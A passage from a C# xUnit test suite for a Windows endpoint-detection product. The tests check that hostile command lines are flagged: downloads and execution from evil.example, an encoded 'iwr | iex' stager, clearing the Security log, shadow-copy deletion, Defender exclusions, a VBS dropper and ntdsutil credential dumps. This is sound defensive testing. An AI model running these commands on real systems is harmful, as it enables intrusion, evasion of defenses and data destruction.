        Assert.Equal(SignatureVerifier.ComputeSha256(cacheTestFile), h1);
        File.WriteAllText(cacheTestFile, "VERSION_2_MODIFIED_LONGER");
        var h2 = SignatureVerifier.ComputeSha256Cached(cacheTestFile);
        Assert.NotEqual(h1, h2);
        Assert.Equal(SignatureVerifier.ComputeSha256(cacheTestFile), h2);

        // 8. Real-world hacker initial-access & defense-evasion command-line attack suite (must catch 100% even when PS 4104 is OFF!)
        var procEval = new ProcessRuleEvaluator();
        string[] realHackerCmds =
        {
            "msiexec.exe /q /i https://evil.example/payload.msi",
            "regsvr32.exe /s /n /u /i:https://evil.example/stage.sct scrobj.dll",
            "powershell.exe -Command \"iwr https://evil.example/rat.exe -OutFile $env:TEMP\\rat.exe; Start-Process $env:TEMP\\rat.exe\"",
            "powershell.exe -w hidden -ep bypass -File C:\\Users\\Public\\loader.ps1",
            "curl.exe -sL https://evil.example/rat.exe -o C:\\Users\\Public\\rat.exe",
            "powershell.exe -Command \"Add-MpPreference -ExclusionPath C:\\Users\\Public\"",
            "wevtutil.exe cl Security",
            "wmic.exe shadowcopy delete /nointeractive",
            "schtasks.exe /create /tn WinSync /tr \"powershell -w hidden https://evil.example\" /sc onlogon"
        };
        int testPid = 55000;
        foreach (var cmd in realHackerCmds)
        {
            var exe = cmd.Split(' ')[0];
            var alert = procEval.Evaluate(new ProcessEvaluationContext
            {
                ProcessId = testPid++,
                ProcessName = Path.GetFileNameWithoutExtension(exe),
                ProcessPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), exe),
                CommandLine = cmd,
                Signature = new SignatureInfo(SignatureStatus.TrustedMicrosoft, "Microsoft Windows")
            }, policy);
            Assert.True(alert is not null && alert.RiskScore >= 80, $"Hacker command slipped through: {cmd}");
        }

        // 9. Korean Hangul (.hwp / .hwpx) magic-header + entropy ransomware detection
        var encryptedHwp = RandomNumberGenerator.GetBytes(8192);
        encryptedHwp[0] = 0xAA;
        Assert.True(EntropyAnalyzer.AnalyzeBytes(encryptedHwp, ".hwp").IsLikelyEncrypted);
        Assert.True(EntropyAnalyzer.AnalyzeBytes(encryptedHwp, ".hwpx").IsLikelyEncrypted);

        // 10. Smart -EncodedCommand Base64 decoding: benign Get-MpComputerStatus allowed, malicious encoded payload caught!
        var benignB64 = Convert.ToBase64String(Encoding.Unicode.GetBytes("$s = Get-MpComputerStatus; $p = Get-MpPreference; $s | ConvertTo-Json"));
        var benignEncAlert = procEval.Evaluate(new ProcessEvaluationContext
        {
            ProcessId = 56001,
            ProcessName = "powershell",
            ProcessPath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            CommandLine = $"powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand {benignB64}",
            Signature = new SignatureInfo(SignatureStatus.TrustedMicrosoft, "Microsoft Windows")
        }, policy);
        Assert.Null(benignEncAlert);

        var evilB64 = Convert.ToBase64String(Encoding.Unicode.GetBytes("iwr https://evil.example/stage2.ps1 | iex"));
        var evilEncAlert = procEval.Evaluate(new ProcessEvaluationContext
        {
            ProcessId = 56002,
            ProcessName = "powershell",
            ProcessPath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            CommandLine = $"powershell.exe -NoProfile -ec {evilB64}",
            Signature = new SignatureInfo(SignatureStatus.TrustedMicrosoft, "Microsoft Windows")
        }, policy);
        Assert.NotNull(evilEncAlert);
        Assert.Equal(ThreatSeverity.Critical, evilEncAlert!.Severity);
        Assert.True(evilEncAlert.RiskScore >= 90);
    }

    [Fact]
    public void LiveLaptopAudit_ZeroHarmAndZeroFalseFreezes_OnActualRunningEnvironment()
    {
        var policy = GuardPolicy.CreateDefault();
        var pc = new ProcessController();
        var sv = new SignatureVerifier();
        var intel = new ThreatIntelStore(_tempRoot);
        var risk = new BehaviorRiskEngine();
        var scanner = new ThreatScanner(sv, intel, pc);
        var procEval = new ProcessRuleEvaluator(null, intel);
        var netGuard = new NetworkGuardMonitor(pc, sv, risk, intel, () => policy);

        // 1. Audit actual Downloads folder files (speed + false positive check)
        var downloadsDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
        if (Directory.Exists(downloadsDir))
        {
            foreach (var file in Directory.EnumerateFiles(downloadsDir))
            {
                var sw = Stopwatch.StartNew();
                var finding = scanner.ScanFile(file, policy, includeClean: false);
                sw.Stop();
                _output.WriteLine(finding is null
                    ? $"[DL CLEAN] {Path.GetFileName(file)} ({sw.ElapsedMilliseconds}ms)"
                    : $"[DL FINDING] {Path.GetFileName(file)} Risk={finding.RiskScore} Sig={finding.Signature.DisplayLabel} Reasons={string.Join("; ", finding.Reasons)} ({sw.ElapsedMilliseconds}ms)");
            }
        }

        // 2. Audit ALL currently running processes on this laptop — ZERO legitimate processes should be auto-frozen (>=75)!
        int highRiskProcessAlerts = 0;
        foreach (var proc in Process.GetProcesses())
        {
            try
            {
                if (proc.Id <= 4) continue;
                var path = pc.GetExecutablePath(proc.Id);
                if (string.IsNullOrWhiteSpace(path)) continue;
                var sig = sv.VerifyFile(path);
                var ev = procEval.Evaluate(new ProcessEvaluationContext
                {
                    ProcessId = proc.Id,
                    ProcessName = proc.ProcessName,
                    ProcessPath = path,
                    Signature = sig
                }, policy);
                if (ev is not null)
                {
                    _output.WriteLine($"[PROC] {proc.ProcessName}({proc.Id}) Risk={ev.RiskScore} {ev.Title} Path={path} Sig={sig.DisplayLabel}");
                    if (ev.RiskScore >= 75) highRiskProcessAlerts++;
                }
            }
            catch { }
            finally { proc.Dispose(); }
        }

        // 3. Audit ALL active IPv4 + IPv6 external connections on this laptop — ZERO legitimate apps should be auto-frozen (>=75)!
        var conns = netGuard.GetActiveExternalConnections();
        _output.WriteLine($"[NET] Active External Connections (IPv4+IPv6): {conns.Count}");
        int highRiskNetAlerts = 0;
        foreach (var c in conns)
        {
            if (!IPAddress.TryParse(c.RemoteIp, out var ip)) continue;
            var ev = netGuard.EvaluateOutboundConnection(c.ProcessId, c.ProcessName, c.ProcessPath, ip, c.RemotePort, policy);
            if (ev is not null)
            {
                _output.WriteLine($"[NET-ALERT] {c.ProcessName}({c.ProcessId}) -> {c.RemoteIp}:{c.RemotePort} Risk={ev.RiskScore} {ev.Title} Path={c.ProcessPath}");
                if (ev.RiskScore >= 75) highRiskNetAlerts++;
            }
        }

        Assert.Equal(0, highRiskProcessAlerts);
        Assert.Equal(0, highRiskNetAlerts);
    }

    [Fact]
    public void CodeReviewHardening_ClosesCommentBypass_CaseEvasion_ExfilDedup_PacHijack_And_ReadOnlyRestore()
    {
        var policy = GuardPolicy.CreateDefault();
        var pc = new ProcessController();
        var sv = new SignatureVerifier();
        var intel = new ThreatIntelStore(_tempRoot);
        var risk = new BehaviorRiskEngine();

        // 1. Comment-injection bypass closed in both -EncodedCommand AND FilelessScriptGuard
        var procEval = new ProcessRuleEvaluator(null, intel);
        var commentBypassB64 = Convert.ToBase64String(Encoding.Unicode.GetBytes("# Get-MpComputerStatus\nvssadmin.exe delete shadows /all /quiet"));
        var encBypassAlert = procEval.Evaluate(new ProcessEvaluationContext
        {
            ProcessId = 57001,
            ProcessName = "powershell",
            ProcessPath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            CommandLine = $"powershell.exe -NoProfile -EncodedCommand {commentBypassB64}",
            Signature = new SignatureInfo(SignatureStatus.TrustedMicrosoft, "Microsoft Windows")
        }, policy);
        Assert.NotNull(encBypassAlert);
        Assert.True(encBypassAlert!.RiskScore >= 90);

        var scriptBypass = FilelessScriptGuard.AnalyzeScriptBlock(
            "# Get-MpComputerStatus ControlledFolderAccessProtectedFolders\n[Reflection.Assembly]::Load($bytes)",
            pid: 0,
            policy);
        Assert.NotNull(scriptBypass);
        Assert.True(scriptBypass!.RiskScore >= 85);

        // 2. Uppercase .VBS extension evasion closed in ScriptFileAnalyzer
        var upperVbsRes = ScriptFileAnalyzer.AnalyzeScriptContent(
            "Set s = CreateObject(\"WScript.Shell\")\ns.Run \"cmd.exe /c whoami\", 0, False",
            ".VBS",
            policy);
        Assert.True(upperVbsRes.IsSuspicious);
        Assert.True(upperVbsRes.RiskScore >= 85);

        // 3. Post-credential exfiltration to a previously-seen IP is NOT suppressed by 30-min dedup
        var netGuard = new NetworkGuardMonitor(pc, sv, risk, intel, () => policy);
        var c2Ip = IPAddress.Parse("198.51.100.77");
        var signedVendor = new SignatureInfo(SignatureStatus.TrustedVendor, "Some Vendor");
        var firstConn = netGuard.EvaluateOutboundConnection(
            pid: 57002, "app", @"C:\Apps\app.exe", c2Ip, 443, policy, signatureOverride: signedVendor);
        Assert.Null(firstConn); // Initially benign connection gets cached

        risk.RecordSignal(57002, "BrowserCredentialDbTheft", 60, marksCredentialAccess: true);
        var exfilConn = netGuard.EvaluateOutboundConnection(
            pid: 57002, "app", @"C:\Apps\app.exe", c2Ip, 443, policy, signatureOverride: signedVendor);
        Assert.NotNull(exfilConn);
        Assert.Equal(ThreatCategory.Exfiltration, exfilConn!.Category);
        Assert.True(exfilConn.RiskScore >= 85);

        // 4. PAC Script (AutoConfigURL) MITM proxy hijacking detected
        var pacAlert = SystemIntegrityGuard.EvaluateProxyDiff("0||", "0||http://evil.example/proxy.pac");
        Assert.NotNull(pacAlert);
        Assert.Equal(ThreatCategory.SystemIntegrityTamper, pacAlert!.Category);

        // 5. Spoofed archiver in high-risk drop path cannot bypass RansomwareDetector velocity checks
        var ransom = new RansomwareDetector();
        SecurityEvent? spoofAlert = null;
        var baseTime = DateTimeOffset.UtcNow;
        for (int i = 0; i < policy.RapidWriteThresholdPer3Sec + 2; i++)
        {
            spoofAlert = ransom.RecordFileActivity(
                pid: 57003,
                processName: "7z.exe",
                processPath: @"C:\Users\Public\7z.exe",
                targetFilePath: Path.Combine(_tempRoot, $"victim_{i}.txt"),
                isRenameOrDelete: false,
                isCanaryFile: false,
                policy: policy,
                nowOverride: baseTime.AddMilliseconds(i * 50),
                checkEntropy: false);
            if (spoofAlert is not null) break;
        }
        Assert.NotNull(spoofAlert);
        Assert.Equal(ThreatCategory.Ransomware, spoofAlert!.Category);

        // 6. Malformed delimiter-only lines in ThreatIntel feed parser do not crash
        var parsedIps = ThreatIntelStore.ParseFeodoIpList(",,,\n  , \t \n185.220.101.1\n");
        Assert.Single(parsedIps);
        Assert.Equal("185.220.101.1", parsedIps[0]);

        // 7. RecoveryVault restores cleanly over an existing ReadOnly file
        var vault = new RecoveryVault(_tempRoot);
        var docPath = Path.Combine(_tempRoot, "contract.txt");
        File.WriteAllText(docPath, "Original clean contract content");
        Assert.True(vault.TrySnapshotFile(docPath));
        var snap = vault.ListSnapshots().Single();
        File.WriteAllText(docPath, "Tampered");
        File.SetAttributes(docPath, FileAttributes.ReadOnly);
        Assert.True(vault.RestoreSnapshot(snap.Id));
        Assert.Equal("Original clean contract content", File.ReadAllText(docPath));

        // 8. Windows directory boundary check never protects sibling folders like C:\WindowsFake
        var winDir = Environment.GetFolderPath(Environment.SpecialFolder.Windows).TrimEnd('\\');
        Assert.False(QuarantineManager.IsProtectedSystemOrSelfPath(winDir + @"Fake\dropper.exe"));
        Assert.True(QuarantineManager.IsProtectedSystemOrSelfPath(Path.Combine(winDir, "System32", "notepad.exe")));
    }

    [Fact]
    public void EndToEndOrchestratorLogic_VerifiesKillChainEscalation_DualPersistenceQuarantine_PidReuse_And_VictimFileSafety()
    {
        var orchDir = Path.Combine(_tempRoot, "orch_e2e");
        Directory.CreateDirectory(orchDir);
        var store = new PolicyStore(orchDir);
        using var orchestrator = new SecurityOrchestrator(store);

        var recorded = new List<SecurityEvent>();
        var interventions = new List<SecurityEvent>();
        orchestrator.EventRecorded += e => recorded.Add(e);
        orchestrator.UserInterventionRequired += e => interventions.Add(e);

        // 1. Low-Friction Multi-Stage Correlation: weak signal (35) stays quiet -> 2nd signal (+50) escalates to Critical prompt!
        orchestrator.ProcessSecurityEvent(new SecurityEvent
        {
            ProcessId = 61000,
            ProcessName = "cli_tool",
            ProcessPath = Path.Combine(orchDir, "cli_tool.exe"),
            Category = ThreatCategory.UnsignedExecution,
            Severity = ThreatSeverity.Medium,
            RiskScore = 35,
            Title = "Unsigned drop path execution",
            RiskSignals = new List<string> { "UnsignedHighRiskDropPath(+35)" }
        });
        Assert.Empty(interventions); // Zero false prompt on single weak signal

        orchestrator.ProcessSecurityEvent(new SecurityEvent
        {
            ProcessId = 61000,
            ProcessName = "cli_tool",
            ProcessPath = Path.Combine(orchDir, "cli_tool.exe"),
            Category = ThreatCategory.NetworkAnomaly,
            Severity = ThreatSeverity.Medium,
            RiskScore = 45,
            Title = "Unsigned dropper outbound network",
            RiskSignals = new List<string> { "UnsignedDropperNetwork(+45)" }
        });
        Assert.Single(interventions);
        Assert.True(interventions[0].RiskScore >= 80);
        Assert.Equal(ThreatSeverity.Critical, interventions[0].Severity);

        // 2. PID-Reuse Defense: AllowOnce on PID 61000 for cli_tool.exe suppresses cli_tool.exe,
        //    but if Windows recycles PID 61000 for malware.exe, immunity is immediately revoked!
        orchestrator.AllowAndResumeProcess(interventions[0], addToWhitelist: false);
        interventions.Clear();

        orchestrator.ProcessSecurityEvent(new SecurityEvent
        {
            ProcessId = 61000,
            ProcessName = "cli_tool",
            ProcessPath = Path.Combine(orchDir, "cli_tool.exe"),
            Category = ThreatCategory.NetworkAnomaly,
            Severity = ThreatSeverity.Critical,
            RiskScore = 90,
            Title = "Same allowed binary"
        });
        Assert.Empty(interventions);

        orchestrator.ProcessSecurityEvent(new SecurityEvent
        {
            ProcessId = 61000,
            ProcessName = "malware",
            ProcessPath = Path.Combine(orchDir, "malware.exe"),
            Category = ThreatCategory.Ransomware,
            Severity = ThreatSeverity.Critical,
            RiskScore = 95,
            Title = "Recycled PID malicious process"
        });
        Assert.Single(interventions); // Caught despite recycled PID!

        // 3. Simultaneous Binary Quarantine (including uppercase .EXE) + Persistence Rollback
        var backdoorExe = Path.Combine(orchDir, "BACKDOOR.EXE");
        var fakeStartupDir = Path.Combine(orchDir, "StartupSim");
        Directory.CreateDirectory(fakeStartupDir);
        var startupLink = Path.Combine(fakeStartupDir, "AutorunBackdoor.lnk");
        File.WriteAllBytes(backdoorExe, new byte[] { 0x4D, 0x5A, 0x90, 0x00 });
        File.WriteAllBytes(startupLink, new byte[] { 0x4C, 0x00, 0x00, 0x00 });

        var persistEvt = new SecurityEvent
        {
            ProcessId = 0,
            Category = ThreatCategory.Persistence,
            Severity = ThreatSeverity.Critical,
            ProcessPath = backdoorExe,
            TargetPath = startupLink,
            Title = "Malicious persistence registration"
        };
        Assert.True(orchestrator.KillAndQuarantine(persistEvt));
        Assert.False(File.Exists(backdoorExe)); // Binary quarantined
        Assert.False(File.Exists(startupLink)); // Startup entry rolled back too!

        // 4. Malicious .ZIP phishing archive can be quarantined cleanly
        var evilZip = Path.Combine(orchDir, "phishing.ZIP");
        File.WriteAllBytes(evilZip, new byte[] { 0x50, 0x4B, 0x03, 0x04 });
        Assert.True(orchestrator.KillAndQuarantine(new SecurityEvent
        {
            ProcessId = 0,
            Category = ThreatCategory.UsbOrDownloadThreat,
            Severity = ThreatSeverity.High,
            TargetPath = evilZip,
            Title = "Malicious ZIP download"
        }));
        Assert.False(File.Exists(evilZip));

        // 5. Victim User Document & Windows System Binary 100% Safety Guarantee
        var preciousDoc = Path.Combine(orchDir, "중요계약서.docx");
        File.WriteAllText(preciousDoc, "절대 삭제되면 안 되는 사용자의 원본 문서");
        var sysCmd = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "cmd.exe");
        orchestrator.KillAndQuarantine(new SecurityEvent
        {
            ProcessId = 0,
            Category = ThreatCategory.Ransomware,
            Severity = ThreatSeverity.Critical,
            ProcessPath = sysCmd,
            TargetPath = preciousDoc,
            Title = "Ransomware attack on user document"
        });
        Assert.True(File.Exists(preciousDoc)); // Victim document untouched!
        Assert.True(File.Exists(sysCmd));      // Windows cmd.exe untouched!

        // 6. All 15 built-in Red-Team self-test checks pass 100%
        var selfChecks = SecuritySelfTestRunner.RunAllSafeChecks();
        Assert.Equal(15, selfChecks.Count);
        Assert.All(selfChecks, c => Assert.True(c.Passed, $"Self-test failed: {c.Name} ({c.Detail})"));

        // 7. Deep-audit regressions:
        //    (a) Developer CLI flags (rg -e / docker -e) never false-trigger PowerShell -EncodedCommand
        var procEval = new ProcessRuleEvaluator();
        var rgAlert = procEval.Evaluate(new ProcessEvaluationContext
        {
            ProcessId = 62001,
            ProcessName = "rg",
            ProcessPath = @"C:\Tools\rg.exe",
            CommandLine = "rg.exe -e ProcessRuleEvaluatorLongIdentifierName c:\\Coding",
            Signature = new SignatureInfo(SignatureStatus.Unsigned, "")
        }, GuardPolicy.CreateDefault());
        Assert.Null(rgAlert);

        //    (b) Normal PowerShell profile with `n / `r / `t escapes + string concats never false-triggers
        var benignProfile = "$a = \"line1`nline2`nline3`nline4`nline5`nline6`t`r\"; " +
                            "$p = 'a'+'b'; $q = 'c'+'d'; $r = 'e'+'f'; $s = 'g'+'h'; $t = 'i'+'j'; Write-Host $p";
        Assert.Null(FilelessScriptGuard.AnalyzeScriptBlock(benignProfile, 62002, GuardPolicy.CreateDefault()));

        //    (c) UTF-16LE encoded malicious .vbs script file is decoded and caught by ScriptFileAnalyzer
        var utf16VbsPath = Path.Combine(orchDir, "utf16_dropper.vbs");
        var utf16Payload = new byte[] { 0xFF, 0xFE }
            .Concat(Encoding.Unicode.GetBytes("Set w = CreateObject(\"WScript.Shell\")\nw.Run \"powershell -w hidden https://evil.example/a.ps1\""))
            .ToArray();
        File.WriteAllBytes(utf16VbsPath, utf16Payload);
        var utf16Res = ScriptFileAnalyzer.AnalyzeFile(utf16VbsPath, GuardPolicy.CreateDefault());
        Assert.True(utf16Res.IsSuspicious);
        Assert.True(utf16Res.RiskScore >= 85);

        //    (d) BinaryTampering on a whitelisted executable is NEVER silenced by WhitelistedExecutablePaths!
        var tamperedWhitelistedPath = Path.Combine(orchDir, "trusted_updater.exe");
        var wlPolicy = orchestrator.CurrentPolicy.Clone();
        wlPolicy.WhitelistedExecutablePaths.Add(tamperedWhitelistedPath);
        orchestrator.UpdatePolicy(wlPolicy);
        interventions.Clear();

        orchestrator.ProcessSecurityEvent(new SecurityEvent
        {
            ProcessId = 62003,
            ProcessName = "trusted_updater",
            ProcessPath = tamperedWhitelistedPath,
            Category = ThreatCategory.BinaryTampering,
            Severity = ThreatSeverity.Critical,
            RiskScore = 95,
            Title = "Tampered whitelisted binary"
        });
        Assert.Single(interventions);
    }

    [Fact]
    public async Task PortfolioFeatures_CustomRuleEngine_MitreNavigatorExport_And_TelemetryMetrics_WorkEndToEnd()
    {
        var featureDir = Path.Combine(_tempRoot, "portfolio_features");
        Directory.CreateDirectory(featureDir);

        var customRules = new CustomRuleEngine(featureDir);
        Assert.Equal(6, customRules.ActiveRuleCount);
        Assert.True(File.Exists(customRules.RulesFilePath));

        var metrics = new TelemetryMetrics();
        var evaluator = new ProcessRuleEvaluator(customRuleEngine: customRules, metrics: metrics);
        var policy = GuardPolicy.CreateDefault();
        var signedMs = new SignatureInfo(SignatureStatus.TrustedMicrosoft, "Microsoft Windows");
        var unsigned = new SignatureInfo(SignatureStatus.Unsigned, "");

        // 1. All 6 default SOC Detection-as-Code rules catch their targeted techniques
        var certutilHit = evaluator.Evaluate(new ProcessEvaluationContext
        {
            ProcessId = 71001,
            ProcessName = "certutil",
            ProcessPath = @"C:\Windows\System32\certutil.exe",
            CommandLine = @"certutil.exe -decode C:\Users\Public\enc.txt C:\Users\Public\payload.exe",
            Signature = signedMs
        }, policy);
        Assert.NotNull(certutilHit);
        Assert.Equal("T1140", certutilHit!.MitreTechniqueId);

        var msbuildHit = evaluator.Evaluate(new ProcessEvaluationContext
        {
            ProcessId = 71002,
            ProcessName = "MSBuild",
            ProcessPath = @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe",
            CommandLine = @"MSBuild.exe C:\Users\Public\inline_task.xml",
            Signature = signedMs
        }, policy);
        Assert.NotNull(msbuildHit);
        Assert.Equal("T1127.001", msbuildHit!.MitreTechniqueId);

        var installUtilHit = evaluator.Evaluate(new ProcessEvaluationContext
        {
            ProcessId = 71003,
            ProcessName = "InstallUtil",
            ProcessPath = @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe",
            CommandLine = @"InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\Public\drop.dll",
            Signature = signedMs
        }, policy);
        Assert.NotNull(installUtilHit);
        Assert.Equal("T1218.004", installUtilHit!.MitreTechniqueId);

        var ntdsHit = evaluator.Evaluate(new ProcessEvaluationContext
        {
            ProcessId = 71004,
            ProcessName = "ntdsutil",
            ProcessPath = @"C:\Windows\System32\ntdsutil.exe",
            CommandLine = @"ntdsutil.exe ""ac i ntds"" ""ifm"" ""create full C:\Temp\dump""",
            Signature = signedMs
        }, policy);
        Assert.NotNull(ntdsHit);
        Assert.Equal("T1003.003", ntdsHit!.MitreTechniqueId);

        var nltestHit = evaluator.Evaluate(new ProcessEvaluationContext
        {
            ProcessId = 71005,
            ProcessName = "nltest",
            ProcessPath = @"C:\Windows\System32\nltest.exe",
            CommandLine = "nltest.exe /domain_trusts /all_trusts",
            Signature = signedMs
        }, policy);
        Assert.NotNull(nltestHit);
        Assert.Equal("T1482", nltestHit!.MitreTechniqueId);

        var tempFwHit = evaluator.Evaluate(new ProcessEvaluationContext
        {
            ProcessId = 71006,
            ProcessName = "patcher",
            ProcessPath = @"C:\Users\Test\AppData\Local\Temp\patcher.exe",
            CommandLine = "patcher.exe --run advfirewall",
            Signature = unsigned
        }, policy);
        Assert.NotNull(tempFwHit);
        Assert.Equal("T1562.004", tempFwHit!.MitreTechniqueId);

        // 2. Benign invocations do NOT false-trigger custom rules
        var benignMsbuild = evaluator.Evaluate(new ProcessEvaluationContext
        {
            ProcessId = 71007,
            ProcessName = "MSBuild",
            ProcessPath = @"C:\Program Files\Microsoft Visual Studio\MSBuild.exe",
            CommandLine = @"MSBuild.exe C:\Coding\MyApp\MyApp.csproj /p:Configuration=Release",
            Signature = signedMs
        }, policy);
        Assert.Null(benignMsbuild);

        var benignCertutil = evaluator.Evaluate(new ProcessEvaluationContext
        {
            ProcessId = 71008,
            ProcessName = "certutil",
            ProcessPath = @"C:\Windows\System32\certutil.exe",
            CommandLine = @"certutil.exe -hashfile C:\Coding\MyApp\app.zip SHA256",
            Signature = signedMs
        }, policy);
        Assert.Null(benignCertutil);

        // 3. Hot-reload SaveAndReload supports custom user rules & honors Enabled=false
        var updatedRules = customRules.GetRulesSnapshot().ToList();
        updatedRules.Add(new DetectionRule
        {
            Id = "CUSTOM-901",
            Name = "Custom SOC Test Rule",
            Description = "Detects custom red-team marker",
            MitreTechniqueId = "T1059.001",
            ProcessNameRegex = @"^customtool(\.exe)?$",
            CommandLineRegex = @"--exfil-test",
            Enabled = true
        });
        updatedRules.Add(new DetectionRule
        {
            Id = "CUSTOM-DISABLED",
            Name = "Disabled Rule",
            ProcessNameRegex = @"^benigntool(\.exe)?$",
            Enabled = false
        });
        customRules.SaveAndReload(updatedRules);
        Assert.Equal(8, customRules.ActiveRuleCount);

        var customHit = evaluator.Evaluate(new ProcessEvaluationContext
        {
            ProcessId = 71009,
            ProcessName = "customtool",
            ProcessPath = @"C:\Tools\customtool.exe",
            CommandLine = "customtool.exe --exfil-test",
            Signature = unsigned
        }, policy);
        Assert.NotNull(customHit);
        Assert.Contains("CUSTOM-901", customHit!.Title);

        var disabledMiss = evaluator.Evaluate(new ProcessEvaluationContext
        {
            ProcessId = 71010,
            ProcessName = "benigntool",
            ProcessPath = @"C:\Tools\benigntool.exe",
            CommandLine = "benigntool.exe --ok",
            Signature = unsigned
        }, policy);
        Assert.Null(disabledMiss);

        // 4. TelemetryMetrics captured evaluations and custom rule hits lock-free
        var snap = metrics.GetSnapshot();
        Assert.True(snap.CustomRuleHits >= 7, $"Expected >=7 custom rule hits, got {snap.CustomRuleHits}");
        Assert.True(snap.AverageEvalMicroseconds >= 0);

        // 5. MITRE ATT&CK Navigator v4.5 JSON export validates schema & highlights observed threats
        var navJson = MitreAttackCatalog.ExportNavigatorLayerJson(new[] { certutilHit, ntdsHit });
        using var doc = System.Text.Json.JsonDocument.Parse(navJson);
        Assert.Equal("enterprise-attack", doc.RootElement.GetProperty("domain").GetString());
        Assert.Equal("4.5", doc.RootElement.GetProperty("versions").GetProperty("layer").GetString());
        var techniques = doc.RootElement.GetProperty("techniques");
        Assert.Equal(40, techniques.GetArrayLength());

        var t1140 = techniques.EnumerateArray().First(t => t.GetProperty("techniqueID").GetString() == "T1140");
        Assert.Equal("#ef4444", t1140.GetProperty("color").GetString());
        Assert.Equal(100, t1140.GetProperty("score").GetInt32());

        var t1486 = techniques.EnumerateArray().First(t => t.GetProperty("techniqueID").GetString() == "T1486");
        Assert.Equal("#10b981", t1486.GetProperty("color").GetString());
        Assert.Equal(75, t1486.GetProperty("score").GetInt32());

        // 6. AuditLogService exports both MITRE Navigator JSON and telemetry-enriched HTML report
        var audit = new AuditLogService(featureDir);
        var exportedNav = audit.ExportMitreNavigatorLayer(new[] { certutilHit }, Path.Combine(featureDir, "mitre_layer.json"));
        Assert.True(File.Exists(exportedNav));
        var exportedHtml = audit.ExportHtmlReport(
            new[] { certutilHit, ntdsHit },
            null,
            Array.Empty<QuarantineEntry>(),
            Array.Empty<VaultSnapshotEntry>(),
            Path.Combine(featureDir, "forensic_report.html"),
            snap);
        var htmlText = File.ReadAllText(exportedHtml);
        Assert.Contains("실시간 ETW 텔레메트리", htmlText);
        Assert.Contains("40개 기법", htmlText);
        Assert.Contains("T1140", htmlText);

        // 7. FirewallController refuses to block protected Windows OS binaries
        var fwResult = await FirewallController.BlockOutboundExecutableAsync(@"C:\Windows\System32\svchost.exe");
        Assert.False(fwResult.Success);
    }

    [Fact]
    public void EnginePerformance_MicroBenchmarks_ReportEmpiricalLatency()
    {
        const int iterations = 1000;
        var benchDir = Path.Combine(_tempRoot, "bench");
        Directory.CreateDirectory(benchDir);

        var customRules = new CustomRuleEngine(benchDir);
        var metrics = new TelemetryMetrics();
        var evaluator = new ProcessRuleEvaluator(customRuleEngine: customRules, metrics: metrics);
        var policy = GuardPolicy.CreateDefault();
        var benignCtx = new ProcessEvaluationContext
        {
            ProcessId = 80001,
            ProcessName = "dotnet",
            ProcessPath = @"C:\Program Files\dotnet\dotnet.exe",
            ParentProcessId = 80000,
            ParentProcessName = "Code",
            ParentProcessPath = @"C:\Users\dev\AppData\Local\Programs\Microsoft VS Code\Code.exe",
            CommandLine = "dotnet.exe build AegisSentinel.slnx -c Release",
            Signature = new SignatureInfo(SignatureStatus.TrustedMicrosoft, "Microsoft Corporation")
        };

        // Warm-up JIT & regex automata
        for (int i = 0; i < 50; i++)
        {
            _ = evaluator.Evaluate(benignCtx, policy);
            _ = EntropyAnalyzer.AnalyzeBytes(Encoding.UTF8.GetBytes(new string('A', 512)), ".txt");
        }

        // Benchmark 1: ProcessRuleEvaluator + CustomRuleEngine (1,000 benign process evaluations)
        var sw = Stopwatch.StartNew();
        for (int i = 0; i < iterations; i++)
        {
            var r = evaluator.Evaluate(benignCtx, policy);
            Assert.Null(r);
        }
        sw.Stop();
        double procUs = sw.Elapsed.TotalMicroseconds / iterations;

        // Benchmark 2: ScriptFileAnalyzer (1,000 script inspections)
        var sampleScript = "param([string]$Env='Release')\nWrite-Host \"Building project in $Env mode\"\ndotnet test --no-build\n";
        sw.Restart();
        for (int i = 0; i < iterations; i++)
        {
            var r = ScriptFileAnalyzer.AnalyzeScriptContent("build.ps1", sampleScript, policy);
            Assert.False(r.IsSuspicious);
        }
        sw.Stop();
        double scriptUs = sw.Elapsed.TotalMicroseconds / iterations;

        // Benchmark 3: EntropyAnalyzer on 64 KB buffer (500 iterations)
        var sampleBuf = new byte[65536];
        new Random(42).NextBytes(sampleBuf);
        sw.Restart();
        for (int i = 0; i < 500; i++)
        {
            var res = EntropyAnalyzer.AnalyzeBytes(sampleBuf, ".txt");
            Assert.True(res.IsLikelyEncrypted && res.ShannonEntropy > 7.9);
        }
        sw.Stop();
        double entropyUs = sw.Elapsed.TotalMicroseconds / 500.0;

        // Benchmark 4: ThreatIntelStore O(1) domain lookup (10,000 lookups)
        var intel = new ThreatIntelStore(benchDir);
        intel.AddBlockedDomain("c2.malicious-test.invalid");
        sw.Restart();
        for (int i = 0; i < 10_000; i++)
        {
            Assert.False(intel.IsDomainBlocked("api.github.com"));
        }
        sw.Stop();
        double iocNs = (sw.Elapsed.TotalMicroseconds * 1000.0) / 10_000.0;

        _output.WriteLine($"[BENCHMARK] ProcessRuleEvaluator (incl. 6 Custom Rules): {procUs:F2} us/op ({1_000_000.0 / Math.Max(procUs, 0.01):N0} ops/sec)");
        _output.WriteLine($"[BENCHMARK] ScriptFileAnalyzer (PS1 inspection):         {scriptUs:F2} us/op ({1_000_000.0 / Math.Max(scriptUs, 0.01):N0} ops/sec)");
        _output.WriteLine($"[BENCHMARK] EntropyAnalyzer (64 KB buffer):              {entropyUs:F2} us/op ({1_000_000.0 / Math.Max(entropyUs, 0.01):N0} ops/sec)");
        _output.WriteLine($"[BENCHMARK] ThreatIntelStore (O(1) domain lookup):       {iocNs:F1} ns/op");

        // Generous regression ceilings (never flaky on slower CI VMs, catches accidental O(N^2) blowups)
        Assert.True(procUs < 2000, $"ProcessRuleEvaluator regressed: {procUs:F2} us/op");
        Assert.True(scriptUs < 2000, $"ScriptFileAnalyzer regressed: {scriptUs:F2} us/op");
        Assert.True(entropyUs < 5000, $"EntropyAnalyzer regressed: {entropyUs:F2} us/op");
    }

    [Fact]
